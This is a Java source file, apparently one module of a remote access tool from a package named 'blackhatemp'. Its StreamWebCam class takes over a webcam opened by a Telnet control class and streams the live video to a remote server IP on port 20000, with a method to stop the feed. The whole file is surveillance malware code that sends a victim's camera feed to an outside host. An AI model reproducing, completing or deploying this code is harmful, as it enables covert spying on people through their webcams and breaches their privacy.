package camera;

import blackhatemp.Telnet;
import java.awt.Dimension;
import java.net.InetSocketAddress;

import com.github.sarxos.webcam.Webcam;

public class StreamWebCam extends Thread {

    private Webcam webcam = null;
    private Dimension dimension = new Dimension(640, 480);
    private StreamServerAgent serverAgent = null;

    public StreamWebCam() {
        if (Telnet.WebcamName != null) {
            if (!Telnet.webcam.isOpen()) {
                webcam = Telnet.webcam;
                webcam.setViewSize(dimension);
            }
        }
    }

    @Override
    public void run() {
        serverAgent = new StreamServerAgent(webcam, dimension);
        serverAgent.start(new InetSocketAddress(Telnet.ServerIP, 20000));
    }

    public void StopCameraOnline() {
        webcam.close();
        webcam = null;
        serverAgent.stop();
        serverAgent = null;
        Webcam.shutdown();
    }
}
